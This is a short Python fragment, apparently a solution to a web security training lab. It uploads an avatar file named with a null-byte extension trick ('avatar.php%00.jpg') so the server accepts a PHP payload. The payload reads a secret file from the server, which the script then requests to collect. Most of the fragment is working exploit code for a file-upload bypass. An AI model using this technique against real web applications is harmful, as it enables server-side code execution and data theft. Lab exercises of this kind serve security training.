...
def upload_file(s,url,cookie):
    URL = url + "/my-account"
    csrf_token=get_csrf_token(s=s,url=URL,cookie=cookie)

    params = {"avatar": ('avatar.php%00.jpg', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'application/x-php'), 
        "user": "wiener",
        "csrf": csrf_token}
    ...
    URL=url+'/my-account/avatar'
    try:
        s.post(url=URL,verify=False,proxies=proxies,data=m,cookies=cookie,headers=headers)
...
def get_secret_key(s,url,cookie):
    URL=url+'/files/avatars/avatar.php'
    try:
